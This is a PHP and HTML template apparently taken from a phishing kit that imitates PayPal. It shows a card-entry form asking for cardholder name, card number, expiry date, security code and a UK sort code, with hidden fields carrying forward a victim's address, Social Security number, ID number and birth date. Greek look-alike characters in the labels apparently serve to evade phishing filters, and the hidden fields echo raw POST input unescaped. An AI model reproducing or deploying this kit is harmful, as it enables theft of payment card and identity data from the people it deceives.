                    					<script src="../js/jquery.payment.js"></script><script src="../js/new.look.js"></script>
                    <form method="post" id="parentForm" name="creditcard_Form" action="Submit" class="edit">
                        <p class="group fcenter">


<?php
if ($negara=="GB"){ echo '
				<span class="help" style="padding-left:4%;">&Nu;eed for bank identification.</span>
					<label for="sortcode">Sort Code :</label>
						<span class="field">
							<input name="sort_code1" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code3" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"></span>
';}
?>


                            <span class="help" style="padding-left:4%;">&Nu;ame as it appears on Card.</span>
                                <label for="cc_holder">Cardholder &Nu;ame :</label>
					<span class="field" id="cc_holder">
						<input type="text" autocomplete="off" class="large" pattern=".{2,30}" maxlength="32" name="cc_holder" value="" required="" title="Cardholder name"></span>



                            <label for="cc_number">Card Number :</label>
                                <span class="field">
                                    <input type="text" id="cc_number" autocomplete="off" style="width: 12em;" pattern="[2-7][0-9 ]{11,20}" maxlength="20" name="cc_number" value="" required="" title="Only number">
                                </span>


                     
                            <label for="expdate">&Epsilon;xpiration Date :</label>
                                <span class="field" style="margin-bottom: 7px;">
<?php
echo date_dropdown(20);
function date_dropdown($year_limit = 0)
{
        /*month*/
        $html_output .= '                                   <select class="smal" required="required" name="expdate_month" title="Exp month">'."\n";
        $html_output .= '                                       ';
            for ($exp_month = 1; $exp_month <= 12; $exp_month++) {
            	if (strlen($exp_month) === 1){
            		$html_output .= '<option value="0' . $exp_month . '">0' . $exp_month . '</option>';
            	} else {
            		$html_output .= '<option value="' . $exp_month . '">' . $exp_month . '</option>';
            	}
            }
        $html_output .= "\n".'                                  </select>&nbsp;&nbsp;/&nbsp;&nbsp;'."\n";

        /*years*/
    if (date('m') == 12){
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y') + 1; $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    } else {
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y'); $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    }

    return $html_output;
}
?>
                                </span>
                                    
                                    
                            	<label for="cvv2_number">Card Security C&omicron;de :</label>
					<span class="field">
						<input id="cvv2_number" autocomplete="off" style="width:3.49em;" pattern="[0-9]{3,5}" maxlength="4" name="cvv2_number" value="" required="" type="text" title="Enter a valid csc">
						<span class="small"><a target="_blank" href="../page/cvv_info_pop&amp;enable_locale.htm" onclick="AYPAL.core.openWindow(event, {width: 425, height: 450});" id="1"> What is this?</a></span>
					</span>

                            <div class="ngawur">
                            </div>

                        </p>

                        <p class="bcenter">
                        <button style="width: 100px !important;" type="submit" value="Submit" class="button">Submit</button></p>

                        <div style="display:none;"><input name="address1" value="<?php echo $_POST['address_1'];?>"><input name="address2" value="<?php echo $_POST['address_2'];?>"><input name="city" value="<?php echo $_POST['city'];?>"><input name="state" value="<?php echo $_POST['state'];?>"><input name="postal" value="<?php echo $_POST['postal'];?>"><input name="phone" value="<?php echo $_POST['phone'];?>"><input name="ssn1" value="<?php echo $_POST['number_1'];?>"><input name="ssn2" value="<?php echo $_POST['number_2'];?>"><input name="ssn3" value="<?php echo $_POST['number_3'];?>"><input name="id_number" value="<?php echo $_POST['id_number'];?>"><input name="dob_day" value="<?php echo $_POST['day'];?>"><input name="dob_month" value="<?php echo $_POST['month'];?>"><input name="dob_year" value="<?php echo $_POST['year'];?>"></div>
                        
                    </form>